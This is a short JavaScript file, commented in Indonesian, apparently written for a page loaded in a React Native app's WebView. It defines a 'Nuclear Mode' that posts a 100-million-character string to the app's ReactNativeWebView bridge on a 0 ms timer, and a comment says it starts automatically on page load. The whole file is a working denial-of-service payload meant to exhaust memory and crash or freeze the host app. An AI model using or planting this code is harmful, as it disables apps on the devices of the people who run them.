const log = msg => document.getElementById("log").textContent += "\n" + msg;

function post(msg) {
    try {
        if (window.ReactNativeWebView) {
            window.ReactNativeWebView.postMessage(msg);
        } else {
            log("ReactNativeWebView not detected.");
        }
    } catch (e) {
        log("Error: " + e.message);
    }
}

function sendLongString() {
    const payload = "A".repeat(100_000_000); // 100 juta karakter
    post(payload);
}

let nuclearTimer = null;

function startNuclear() {
    log("ðŸš¨ Nuclear Mode 0ms started automatically!");
    nuclearTimer = setInterval(sendLongString, 0); // kirim secepat mungkin
}

// Mulai otomatis saat halaman dibuka
